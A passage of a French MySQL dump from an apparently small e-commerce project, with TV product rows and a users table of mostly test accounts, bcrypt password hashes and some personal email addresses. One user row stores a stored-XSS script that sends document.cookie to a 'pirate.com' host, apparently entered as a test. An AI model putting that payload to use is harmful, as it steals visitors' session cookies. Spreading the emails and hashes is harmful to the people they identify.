(120, 'AR202508130029', 'Hisense 43E7Q', 'Téléviseur QLED 4K 43\" (109 cm) - Dolby Vision/HDR10+ - Alexa/Vidaa Voice', 399.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/39/LD0006273992.jpg'),
(121, 'AR202508130030', 'Hisense 50A6Q', 'Téléviseur LED 4K UHD 50\" (126 cm) 16/9 - Dolby Vision/HDR10+ - 3x HDMI 2.1', 399.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/25/LD0006272525_0006273528_0006273549.jpg'),
(122, 'AR202508130031', 'Hisense 50E7Q', 'Téléviseur QLED 4K 50\" (126 cm) - Dolby Vision/HDR10+ - Dolby Atmos', 449.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/41/LD0006274132.jpg'),
(123, 'AR202508130032', 'Hisense 50U7Q', 'TV Mini LED QLED 4K 50\" (126 cm) - 144 Hz - Dolby Vision IQ - HDMI 2.1', 699.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/41/LD0006274188.jpg'),
(124, 'AR202508130033', 'Hisense 55A6Q', 'Téléviseur LED 4K UHD 55\" (139 cm) 16/9 - Dolby Vision/HDR10+', 449.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/25/LD0006272525.jpg'),
(125, 'AR202510290019', 'Hisense 55A85Q', 'TV OLED 4K 55\" (139 cm) - 100/120 Hz - Dolby Vision IQ - IMAX Enhanced', 999.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/29/36/LD0006293696.jpg'),
(126, 'AR202510200155', 'Hisense 55E7Q', 'Téléviseur QLED 4K 55\" (139 cm) - Dolby Vision/HDR10+ - Dolby Atmos', 499.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/29/04/LD0006290462.jpg'),
(127, 'AR202508130034', 'Hisense 55E7Q Pro', 'Téléviseur QLED 4K 55\" (139 cm) - 120 Hz - Dolby Vision IQ', 599.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/44/LD0006274427.jpg'),
(128, 'AR202508130035', 'Hisense 55U7Q', 'TV Mini LED QLED 4K 55\" (139 cm) - 144 Hz - HDMI 2.1 - Son 2.1 40W', 799.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/41/LD0006274198.jpg'),
(129, 'AR202508130036', 'Hisense 55U8Q', 'TV Mini LED QLED 4K 55\" (139 cm) - 165 Hz - Son 4.1.2 80W', 999.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/45/LD0006274541.jpg'),
(130, 'AR202601280101', 'Hisense 65A7Q', 'Téléviseur QLED 4K 65\" (164 cm) - Dolby Vision/HDR10+ - Son 2.1 40W', 649.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/31/50/LD0006315091.jpg'),
(131, 'AR202405140105', 'Hisense 65E7NQ', 'Téléviseur QLED 4K 65\" (164 cm) - Dolby Vision/HDR10+ - AirPlay 2', 599.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/13/90/LD0006139027.jpg'),
(132, 'AR202508130039', 'Hisense 65E7Q Pro', 'Téléviseur QLED 4K 65\" (164 cm) - 120 Hz - Google Assistant', 749.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/44/LD0006274459.jpg'),
(133, 'AR202510200150', 'Hisense 65E8Q', 'TV Mini LED QLED 4K 65\" (164 cm) - Dolby Vision IQ - HDMI 2.1', 899.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/29/24/LD0006292462.jpg'),
(134, 'AR202405140111', 'Hisense 65U7NQ', 'TV Mini LED QLED 4K 65\" (165 cm) - 144 Hz - IMAX Enhanced', 949.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/16/23/LD0006162300.jpg'),
(135, 'AR202508130040', 'Hisense 65U7Q', 'TV Mini LED QLED 4K 65\" (164 cm) - 144 Hz - HDMI 2.1', 949.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/42/LD0006274284.jpg'),
(136, 'AR202508130041', 'Hisense 65U8Q', 'TV Mini LED QLED 4K 65\" (164 cm) - 165 Hz - Son 4.1.2 80W', 1290.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/45/LD0006274572.jpg'),
(137, 'AR202508130053', 'Hisense 75A6Q', 'Téléviseur LED 4K UHD 75\" (189 cm) 16/9 - Dolby Vision - 30W', 849.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/25/LD0006272525_0006273475_0006273509.jpg'),
(138, 'AR202508130054', 'Hisense 75E7Q Pro', 'Téléviseur QLED 4K 75\" (189 cm) - 120 Hz - HDMI 2.1', 999.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/45/LD0006274504.jpg'),
(139, 'AR202508130058', 'Hisense 85U7Q', 'TV Mini LED QLED 4K 85\" (215 cm) - 144 Hz - Son 2.1 40W', 1890.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/43/LD0006274360.jpg'),
(140, 'AR202508130026', 'Hisense 32A4Q', 'Téléviseur LED Full HD 32\" (81 cm) 16/9 - Wi-Fi - HDMI', 229.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/41/LD0006274108.jpg'),
(141, 'AR202508130038', 'Hisense 65A6Q', 'Téléviseur LED 4K UHD 65\" (164 cm) 16/9 - Dolby Vision/HDR10+', 599.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/25/LD0006272525_0006273475.jpg'),
(142, 'AR202510200159', 'Hisense 65E7Q', 'Téléviseur QLED 4K 65\" (164 cm) - Dolby Vision/HDR10+ - HDMI 2.0', 599.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/29/04/LD0006290477.jpg'),
(143, 'AR202508130055', 'Hisense 75U7Q', 'TV Mini LED QLED 4K 75\" (189 cm) - 144 Hz - FreeSync Premium', 1190.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/43/LD0006274313.jpg'),
(144, 'AR202508130057', 'Hisense 85A6Q', 'Téléviseur LED 4K UHD 85\" (215 cm) 16/9 - Dolby Vision - 30W', 1490.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/25/LD0006272525_0006273475_0006273509_0006273522.jpg'),
(145, 'AR202503200032', 'Hisense 65E7NQ + HS2100', 'TV QLED 4K 65\" + Barre de son 2.1 - 240 Watts', 749.00, 'Bundle TV', 'https://media.ldlc.com/r150/ld/products/00/06/22/92/LD0006229222.jpg'),
(146, 'AR202508130056', 'Hisense 75U8Q', 'TV Mini LED QLED 4K 75\" (189 cm) - 165 Hz - Son 4.1.2 80W', 1590.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/46/LD0006274610.jpg'),
(147, 'AR202506240062', 'LG 32LQ630B6LA', 'Téléviseur LED HD 32\" (81 cm) - Bluetooth 5.0 - Son 2.0 10W', 249.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/25/77/LD0006257722.jpg'),
(148, 'AR202501290044', 'LG 43NANO82T6B', 'Téléviseur LED 4K 43\" (109 cm) - 50 Hz - HDR10/HLG - Son 20W', 399.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/20/08/LD0006200821_0006208462.jpg'),
(149, 'AR202410240015', 'LG 43QNED77', 'Téléviseur QNED 4K 43\" (109 cm) - 50 Hz - Wi-Fi/Bluetooth', 449.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/18/60/LD0006186028.jpg'),
(150, 'AR202505190119', 'LG 43UA75006LA', 'Téléviseur LED 4K 43\" (108 cm) - 60 Hz - HDR10/HLG - AirPlay 2', 379.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/24/71/LD0006247137_0006247152_0006247175_0006247186.jpg'),
(151, 'AR202505190120', 'LG 50UA75006LA', 'Téléviseur LED 4K 50\" (126 cm) - 60 Hz - HDR10/HLG - VRR/ALLM', 429.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/24/71/LD0006247137_0006247152_0006247175.jpg'),
(152, 'AR202505190116', 'LG 55QNED85A6C', 'TV QNED evo AI Mini LED 4K 55\" - 120 Hz - HDMI 2.1', 899.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/24/70/LD0006247034.jpg'),
(153, 'AR202505190122', 'LG 55UA75006LA', 'Téléviseur LED 4K 55\" (139 cm) - 60 Hz - AirPlay 2 - 20W', 499.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/24/71/LD0006247137_0006247152.jpg'),
(154, 'AR202505190117', 'LG 65QNED85A6C', 'TV QNED evo AI Mini LED 4K 65\" - 120 Hz - HDMI 2.1', 1190.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/24/70/LD0006247034_0006247049.jpg'),
(155, 'AR202505190118', 'LG 75QNED85A6C', 'TV QNED evo AI Mini LED 4K 75\" - 120 Hz - HDMI 2.1', 1690.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/24/70/LD0006247034_0006247049_0006247066.jpg'),
(156, 'AR202505190124', 'LG 75UA75006LA', 'Téléviseur LED 4K 75\" (189 cm) - 60 Hz - HDR10/HLG', 899.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/24/71/LD0006247137_0006247166.jpg'),
(157, 'AR202404240107', 'LG 86QNED85', 'Téléviseur QNED 4K 86\" (217 cm) - 120 Hz - Dolby Vision IQ', 2490.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/13/88/LD0006138856.jpg'),
(158, 'AR202504150007', 'LG OLED42C5', 'TV OLED evo AI 4K UHD 42\" - 120 Hz - Dolby Vision - G-Sync', 1090.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/29/58/LD0006295864.jpg'),
(159, 'AR202509300075', 'LG OLED42C5 + LG S70TY', 'TV OLED 42\" + Barre de son 3.1.1 - 400 Watts', 1390.00, 'Bundle TV', 'https://media.ldlc.com/r150/ld/products/00/06/29/58/LD0006295868.jpg'),
(160, 'AR202504150009', 'LG OLED48C5', 'TV OLED evo AI 4K UHD 48\" - 120 Hz - Dolby Atmos - 40W', 1290.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/24/03/LD0006240330.jpg'),
(161, 'AR202509300074', 'LG OLED48C5 + LG S70TY', 'TV OLED 48\" + Barre de son 3.1.1 - 400 Watts', 1590.00, 'Bundle TV', 'https://media.ldlc.com/r150/ld/products/00/06/28/35/LD0006283560.jpg'),
(162, 'AR202504150015', 'LG OLED55C5', 'TV OLED evo AI 4K UHD 55\" - 120 Hz - Dolby Vision - HDMI 2.1', 1590.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/24/03/LD0006240330_0006240335_0006240385.jpg'),
(163, 'AR202509300070', 'LG OLED55C5 + LG S70TY', 'TV OLED 55\" + Barre de son 3.1.1 - 400 Watts', 1890.00, 'Bundle TV', 'https://media.ldlc.com/r150/ld/products/00/06/28/35/LD0006283535.jpg'),
(164, 'AR202504150016', 'LG OLED55G5', 'TV OLED evo AI 4K UHD 55\" - 120 Hz - VRR 165 Hz (sans pieds)', 1990.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/24/05/LD0006240512.jpg');

-- --------------------------------------------------------

--
-- Structure de la table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` text NOT NULL,
  `email` text NOT NULL,
  `password` varchar(255) DEFAULT NULL,
  `merchant_id` int DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=122 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `users`
--

INSERT INTO `users` (`id`, `username`, `email`, `password`, `merchant_id`) VALUES
(1, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$7tuETLQxmnwrOPdsjWPU8eZ6umDgaw4Lx', NULL),
(2, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$wdC0jRGv5Jgmvxv6nqjri.evsE4DJ39UK', NULL),
(3, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$VqfZX6Ydvrnm54qTdB9qxuCVCjhv3wgZA', NULL),
(4, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$J04KM.V9j8u2WzxrXTCbkOGDx52XQ32u4', NULL),
(5, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$BaQg2ij6M8FAzQthRi9mkuY0bK//FYJ8N', NULL),
(6, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$zmqGvLfOFUq8A1SRQlCe/eIATi8g63l2g', NULL),
(7, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$ijUop5z5UxBx8k0e12sHFe36JNICUblGd', NULL),
(8, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$ak4PLBQcKsv4EMX8eWhtwezBP9AU4Xt0L', NULL),
(9, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$M5i70ovJC7ur2XZi24116.OPAgka2ZO.x', NULL),
(10, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$7bS8m6e0/4I0f9KnjE3Kt./CoXhShYff0', NULL),
(11, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$n8lQ2.p5NAxxiUVRY.nodOZDjLaQ1.v4P', NULL),
(12, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$ONGWcNTB1SE9O90hU62WLe/dYk7g8g5vH', NULL),
(97, 'naruto', 'naruto@gmail.com', '$2y$10$KHZv3CLCoG9PlZrnuh9v5eWpElaVscKe.zQf8eQjEFnGs..DwbS7C', NULL),
(14, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$sGAj8xyjpCVrA2xktN1zk.ReXsBiCvSjW', NULL),
(15, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$GGpcVXMZyNxhUPMJAlA5C.uUcSiY4fN87', NULL),
(16, 'ezechiel@gmail', 'TESTE@seyrinsecuresyssys.com', '$2y$10$fUujWz2.nHxpowh3NUq64.9bCvTyR1jEv', NULL),
(17, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$bmLy8c1zt2J4l.KZL6GdMeT2TbRluLeS0', NULL),
(18, 'teste', 'test@gmail.com', '$2y$10$qBKcA4fzxAiZc5ksKWkyOeZ7aCJPmxbW9', NULL),
(19, 'ezechiel@gmail.com', 'test', '$2y$10$SrpmEapAzbp4GDCvrBPvUOIys41iYvJFI', NULL),
(20, 'test@gmail.com', 'test', '$2y$10$Fbqptztrgki1vG0h6MQbO.gM8CFjLFy8DR7k0BdDitljp7Pkle.ei', NULL),
(21, 'test@gmail.com', 'test', '$2y$10$oy2KkloNj/4D.fhIHXeEju2EIHlsl4bb/V0Yy.0hhpMrsgc8XL2UO', NULL),
(22, 'test@gmail.com', 'test', '$2y$10$nUMbwFhY6HfJFAAjtD.nfuxLrvumBdDfYEL0UW4ry21PY69fNqQKa', NULL),
(23, 'test1@gmail.com', 'test1', '$2y$10$DOMxvIJYaRZDALzHC63.GehMrebdQTthwbRNElQXN2p5i2TyjNXBm', NULL),
(24, 'test2@gmail.com', 'test', '$2y$10$iOvxJ/XdWUftOP6YvOAM3OV4AhdRmlhFk7oqHzLD3YJckIcDk96zy', NULL),
(25, 'hello', 'hello1@gmail.com', '$2y$10$MpICVLFRRTZmnciWLChTo.CpAa2a2gNaIMBDAFVGb3u/57wuPkS7a', NULL),
(26, 'hello1@gmail.com', 'TESTE@seyrinsecuresyssys.com', '$2y$10$GYyuNohQnXiaLJWLVV/2Jexkv6EK511uB/I0Wyk3rbjDSumPCA4ne', NULL),
(27, 'hello1@gmail.com', 'kouakouezechielk06@gmail.com', '$2y$10$5wuiPEdS2Rb.PkPMOSj/XuhhRHrMTtSgY54Hm6s7SOABbJYyMaG4i', NULL),
(28, 'hello', 'hello3@gmail.com ', '$2y$10$VC9nA8MWtMnudJnRMcAHXeNWSiAORfQsQngGTEW.2dzzmgooKlMnC', NULL),
(29, 'hello', 'hello3@gmail.com', '$2y$10$zdNSil684I85H4i3JXGL.e26SHBN35woj5bhR1ioQnzsdy45Je4hS', NULL),
(30, 'john', 'john@gmail.com', '$2y$10$Gky7pBhGsBeZZleqQSgy0erfhOubZTQb6JzS8FXcRMQmXFgmTii9y', NULL),
(31, 'hello1@gmail.com', 'kouakouezechielk06@gmail.com', '$2y$10$cez0u4hVTGBadfH0avz6KuJxza6.owoy71dbNNmfriw9bqyB6a2z2', NULL),
(32, 'user1', 'user1@gmail.com', '$2y$10$w5b42c5oPfzGgIaivPlVDetyXehWSoByKo/lUg9nW1GOXV1diTzAe', NULL),
(33, 'user2', 'user2@gmail.com', '$2y$10$7I4AAfSYEC9Mb841X3R8hO4/mrDyW.gPqlh9/7T/vUkEJfzz1jl6G', NULL),
(34, 'testeur', 'teste@gmail.com', '$2y$10$fvf/QN2V/HBahsxEVXhDP.r16WzBS2O4PXjhcBPvEoAOs0Gjof6bC', NULL),
(35, 'test', 'test1@gmail.com', '$2y$10$Q1YrO7tbQXvewYalUETU3utV3APQxAjj19N4Y5S4jMiLtdYVK7mwa', NULL),
(36, 'teste', 'test2@gmail.com', '$2y$10$vkTa98Z2UhjMfxW8v4A95ep5f1/cxt0Xri/ikFMuFoIwrHaX7f.82', NULL),
(37, 'teste', 'test3@gmai.com', '$2y$10$efA0QuYJx9WMQHEGJ4iI7OyJm/zxb6iuQSJ6eyV1OFg4MAdaEqbJa', NULL),
(38, 'test4', 'test4@gmail.com', '$2y$10$v9fISB38MKKWPHq64WKS2eOhoFbCeyra.vLJ34qsthih5toej5c4q', NULL),
(39, 'test5', 'test5@gmail.com', '$2y$10$DIU6HGim8Kl9.XC2K7ud2uka8jHXI63vJ1FepITAwIc02SOsfi3oK', NULL),
(40, 'test6', 'test6@gmail.com', '$2y$10$OdMfyJtuMq1kCS4eY.q7AOfkIZK1uvxhEJboZ4lEwNzc6TRoPaOM2', NULL),
(41, 'teste7', 'test7@gmail.com', '$2y$10$kPNE7LS8ZpgAmleQCkIF5us.US1MNW7wMOiIYXTBmgdvVfzgxC/te', NULL),
(42, 'test8', 'test8@gmail.com', '$2y$10$bWHcA0qbSWLPq5ajqw5RwuThE76BOslBPzknl2Rm3.WYsiXAfS/jy', NULL),
(43, 'test9', 'test9@gmail.com', '$2y$10$jX58xezadjnsTOO.RUm46.OV0u4Q8v3cELaiM3GRB4IGd2w27Wkt.', NULL),
(44, 'test10', 'test10@gmail.com', '$2y$10$4yT/g07b7tMIKGIWYzYh8OnCOQVuUHLGNTogPJ/lODTD8DX7mPJnO', NULL),
(45, 'test11', 'test11@gmail.com', '$2y$10$G.Odrhxae6a2NtpmtGT3Fen2UllFO5Z7Ncs24hmiGPAixuS23evES', NULL),
(46, 'test12', 'test12@gmail.com', '$2y$10$JInGQh0UVAGdPDnBNDfmhuLzzN.ed/GnKXdpZatyVM9oaFhyk9b5.', NULL),
(47, 'test13', 'test13@gmail.com', '$2y$10$3/1kwvW5J6zWYGnAuo.qeOXRP3M8UvGPsns2b46L1WMQMZRHNrf.2', NULL),
(48, 'test14', 'test14@gmail.com', '$2y$10$WYDYKPkzRuGrJKEcgB0Kh.RL12dxNWyTDX7KWRbr1Mg8zWcSDn0uu', NULL),
(49, 'test16', 'test16@gmail.com', '$2y$10$rNf8FUcGXtT1017HjOpNju1NjRA8yYGfLVIAPjeSQsG7.1V6I8W2G', NULL),
(50, 'test', 'test18@gmail.com', '$2y$10$7p1tc4FxNyKUyG0haSntIuvj9NUa.o3TkS2qIvDzByQFWpNRPfQHa', NULL),
(51, 'test19', 'test19@gmail.com', '$2y$10$sieOAiE4oUxx1bXK6s4oMeVDe1qgwrkEx5fBIfhiTUuLbShEqIHyy', NULL),
(52, 'Ezecheil Kouakou', 'eze@gmail.com', '$2y$10$5RTV/1naHdR3U8txJXqV7ulhsl3XHEIYHVGSTTzZK9.qFAJtwilvS', NULL),
(53, 'Ezechiel Kouakou', 'kk@gmail.com', '$2y$10$5RD5CAs7YowGz42NnWsXPOU46l2bYaDm1djUefiD8hxEFxz/SiQYe', NULL),
(54, 'test', 'test20@gmail.com', '$2y$10$F2lGApc6qe3mcFW0HSSAGu1pVnDaZqtYO7HrY9yyPQ1bwxBFyv69C', NULL),
(55, 'test', 'test21@gmail.com', '$2y$10$USpH8QehHqkp44yLWkHkoeWx037toYajLaXmVkRry0qLUEqvIQSza', NULL),
(56, 'Ezechiel ', 'kouakou@gmail.com', '$2y$10$7U9aCmIHkPl8klfMLge2O.C0SySyNWzegCJ1hlwDxS8Mwf5T64xOG', NULL),
(98, 'kouakou ezechiel ', 'ezechielkouakou@gmail.com', '$2y$10$ZzpJFiRkOonnDNEgvTbY5eOKhs2G7RiURq2sph5PW66qmYUpuj66m', NULL),
(58, 'hello1@gmail.com', 'hello32@gmail.com', '$2y$10$poIBZJicrlbEYzUfqs1JOuRqYSU7kGlX0ouO0CtJDzwe50t9hHKN2', NULL),
(59, 'hello1@gmail.com', 'hello42@gmail.com', '$2y$10$Zu23.fMg7pwoHtuTtVBekeRosEE3jKfswJJzx2ioddEeBir2PYs.G', NULL),
(60, 'hello1@gmail.com', 'heeloEZ@gmail.com', '$2y$10$XSOhXVuO.3g9ff8wffh4kO9FnLzZWoRdYLjB.NTYLz4IsaEPjcZRy', NULL),
(61, 'hello1@gmail.com', 'heelo12@gmail.com', '$2y$10$BIk/ZR5IrhXFw0bsuNKZ4.RIWMhahsJDUoLlvm2kQmHLiXs54NA/e', NULL),
(62, 'hello1@gmail.com', 'heelo@gmail.com', '$2y$10$mOcIGcMywmFSNocVnYXeg.3/Qi8MUfaJYvPVw5KYL5oUGycLU8a5a', NULL),
(63, 'hello1@gmail.com', 'heelo10@gmail.com', '$2y$10$evYZ78h7L6PPHf7wmFUmHeaEuaZFjtK8uFgk/JonfT94SuJJNtqo.', NULL),
(64, 'hello1@gmail.com', 'heelo@309gmail.com', '$2y$10$896/tYEgDbMg.7FLSqFPweQeFYK44H80Hbm7Au9LZrIgovGSLvUv6', NULL),
(65, 'hello ', 'kobon', '$2y$10$an2E.29Igw6PphjHRv/Pm.ppLk9HYqljLF5mZLpsuMa/xFww8OQwa', NULL),
(66, 'hello1@gmail.com', 'heelo96@gmail.com', '$2y$10$gpmZL03wLjYwtlDcSbPNzu6H4IPzjGGdKw0.vwQx5gi5i6NAualju', NULL),
(67, 'hello1@gmail.com', 'heelo60@gmail.com', '$2y$10$NQn1/.uPBINzJvZezumPRusiT0f/bNZ1fbzxs.NiFKxi05.RJ8J8e', NULL),
(68, 'user5', 'user5@gmail.com', '$2y$10$ZatigvE.7eI/DzBJWxpGx.S80fYT4nWdduzGKdsiyuLXbFY/5upIi', NULL),
(69, 'user6', 'user6@gmail.com', '$2y$10$Dud2N49wqv/sx518pdunhe5RWB6f3Qa6E/5D2TWGDyNFuCkcXjZn2', NULL),
(70, 'user7', 'user7@gmail.com', '$2y$10$5fGygl9D.YmVQexzQmZ2DuPkzhKH5aTHxca4ZjtwHgtfqXMEBCXZq', NULL),
(71, 'User8', 'user8@gmail.com', '$2y$10$POC.bm2exMb7ETGXaxJA7uJrsyZLAO/clEbOfudfwHk6GABWMvWL.', NULL),
(72, 'utilisateur1', 'utilisateur1@gmail.com', '$2y$10$cjnfROZFZMdUf3ME/XdLFuFvN.moYf8Ak4J4GweGngCQPJeGmLpEa', NULL),
(73, 'user5@gmail.com', 'g@g.com', '$2y$10$BFuRBpJ/X13v8jWOupbokOJbaueOtlmx3KYZo8rw6FaJj8E6UFzTy', NULL),
(74, 'user5@gmail.com', 'e@gmail.com', '$2y$10$XAxAn3ke7Y8NyH9kn2n3GeylSxBF87h2izpTQSNn7OtsukPjNexEO', NULL),
(75, 'user5@gmail.com', 'gg@gmail.com', '$2y$10$TlcvsbyFn5Jz3BbQd8tKBushM49eGIuVsLy/JlF/2p/pQ8046OLQy', NULL),
(76, 'user5@gmail.com', 'ggg@gmail.com', '$2y$10$aFLNvaBAlbLUeO/m15i93Og6o/P9kWKdz7jg.EM.5irszTYYbYqPS', NULL),
(77, 'user5@gmail.com', 'gggg@gmail.com', '$2y$10$iBMCoxnCL7aBm3arI.qRZOOzlJOdVj6Z0KlAS.THZ3M43BCWSSI4q', NULL),
(78, 'user5@gmail.com', 'll@gmail.com', '$2y$10$eevnL1tmhMhjeordO0FBFeX2N5HdJ2OajVxEvllas5d3p6SWQnGw2', NULL),
(79, 'user5@gmail.com', 'lll@gmail.com', '$2y$10$h4Fxhuld.5no2uD1cZSDbefVq9q2oqfVmtps6XJAgjb/Pi7qZ5ZVy', NULL),
(80, 'user5@gmail.com', 'test@gmail.com', '$2y$10$RHaWrbSqYrX8s9R9K5dkg.GSiKCXacgRLClNWDLhKmp4QA7rJQ3Ni', NULL),
(81, 'user5@gmail.com', 'test@gmail.com', '$2y$10$uqi5SaTBooP3cJIaBFw66.xfKrpGc3qV4evkfuoT1UcU83OlHNcjC', NULL),
(82, 'user5@gmail.com', 'test@gmail.com', '$2y$10$sFzg25G4SIebtzJ2VNt9AOtvfBqd19UGHQFM3zVpMQq1wiOvDY9eS', NULL),
(83, 'user5@gmail.com', 'test@gmail.com', '$2y$10$4iSk9GAZsUN0rQldPHw4IeunFNFPmGAhgPMgXll7uVP5mfa4lvyW2', NULL),
(84, 'user5@gmail.com', 'test@gmail.com', '$2y$10$SV4BSNN130JYv2pd6J6aeu.la.sphp1vmd7aXiDNUmOZc4pmzCvjm', NULL),
(85, 'user5@gmail.com', 'test@gmail.com', '$2y$10$V/BPKbNjyjj4qUGkSx2YGuoDeLudInyKFXsNXiKfc7L.AR4W1jPlu', NULL),
(86, 'Eze', 'eze@gmail.com', '$2y$10$95Y9/NIjyd8XPa8OF3Kw1uOi6dhNS0Mm0/imawkqYbDZOpxNlmAYC', NULL),
(87, 'testP', 'testP@gmail.com', '$2y$10$jbG1NR1F0t5LL6ZJBAi1uOc00AdbZv/bh8PPMh/Vye07GqbwQgHl.', NULL),
(88, 'test', 'test56@gmail.com', '$2y$10$UIvljWq09akhtn7k46wd3.RvK431ytkVcBVatSktodI1RbP7YEN3u', NULL),
(95, 'Eze', 'ezekk@gmail.com', '$2y$10$2v6b4DmWtjN7aaGzLs32/.8RP0vlEXLPoYsHTXeVjiXGJIMttKpWi', NULL),
(96, 'teste ', 'test@gmail.com', '$2y$10$kk.4SCFvX.VkvfofkH53i.MWRCkjDfRLHXGMoL2GVykbC8cuznKya', NULL),
(91, 'eze kouakou', 'eze5@gmail.com', '$2y$10$udJcy0eMc9U5/3OXzjhKeeezn9ONTDzziKYQ5ykud/w28CreewyGO', NULL),
(92, 'eze', 'eze3@gmail.com', '$2y$10$YZBCc/xxXM2vYasZy0GibuE.MoD1wGbGRcFGJiMQz2A51IPU7jnOS', NULL),
(93, 'Ezechiel kouakou', 'ezek@gmail.com', '$2y$10$x9DKZ5ADpnhU8uz9j2yRB.endVHJCaJHhF4aZpa33OXzQRUgwhwv.', NULL),
(94, 'ezechiel', 'ezechielk06@gmail.com', '$2y$10$LafZdkEonAbYepNQ5FO1NuBBf5G1q3E52gasR2.lxlbcKBkqTfpAa', NULL),
(99, 'ezechiel kouakou', 'ezechielkouakou06@gmail.com', '$2y$10$wf0EPv15p1rUuHw6ZY8xLuetPHQYKeEUE.6LVDisPQa6soHqoIAY6', NULL),
(100, 'Ezechiel', 'ezechielk06@gmail.com', '$2y$10$nIbvHZT0fkMnnxtigOvBJuD6GITm2iNlY8qJ6kOVT9.CLW2YQ0.pe', NULL),
(101, 'Ezechiel', 'ezechielk07@gmail.com', '$2y$10$JSPIOg1vQjU4mYUQ9skvre1lz890LUP34QjYEukZ9Ne/n5REBz0RS', NULL),
(102, 'Ecotech', 'usertest@gmail.com', '$2y$10$Inp.omsznh/W4k7yYLeLoO78hvMrXoEls5akzRDKa8bZaPVrWLDba', NULL),
(103, 'usertestFeed', 'usertestFeed@gmail.com', '$2y$10$ETTeYSyD/XCDwM7p/gAf9Og988XK3kopJT//vhJww7Jrxqc.BMwZy', NULL),
(104, 'naruto', 'naruto@gmail.com', '$2y$10$zun0sV5RjGqVv5suI9YKJurl.0HMwAYq7G0QeU2byrX9irQem.kty', NULL),
(105, 'userTest2', 'userTest2@gmail.com', '$2y$10$IRK5TCNfOy2COvGK6ZuJUej82hIJutxkWIpXYA5QKVX05.MOWm1w.', NULL),
(106, '<script>fetch(\'http://pirate.com?cookie=\' + document.cookie)</script>', '<script>fetch(\'http://pirate.com?cookie=\' + document.cookie)</script>', '$2y$10$KK0AGogiWOIuZlP3oQmdbea8ZOHZUgeRMicxsAwj1Mq.ciJl7NCbe', NULL),
(107, 'user8', 'user8@gmail.com', '$2y$10$3hKqmuUm3AiX/cuACUOVN.bYJcI6KsLbmyMN.rp7EO7ud7Wsi5npy', NULL),
(108, 'hello', 'user5@gmail.com', '$2y$10$A73LOulN7b7vC4mpPMCJfu71yNd0BJWMLj9b/EcwNIgd4jHyc/apK', 1),
(109, 'hello', 'user5@gmail.com', '$2y$10$VPUBB9DjC1DyadaieRF5vO7pHwOuYCBYmoKyVSbf7mE3C4b7mFhMG', 1),
(110, 'hello', 'user5@gmail.com', '$2y$10$UgvI2ePoEXXPdr9g7/LSQ.bAJrKdDTLwpE1t0LrGGFoPUhzmg8Kxu', 1),
(111, 'hello', 'user5@gmail.com', '$2y$10$Mjq7jKjx/RErNf8uOpIwneiuQUeAFtqSCEmLN03oIIbQjvSz4i3d2', 1),
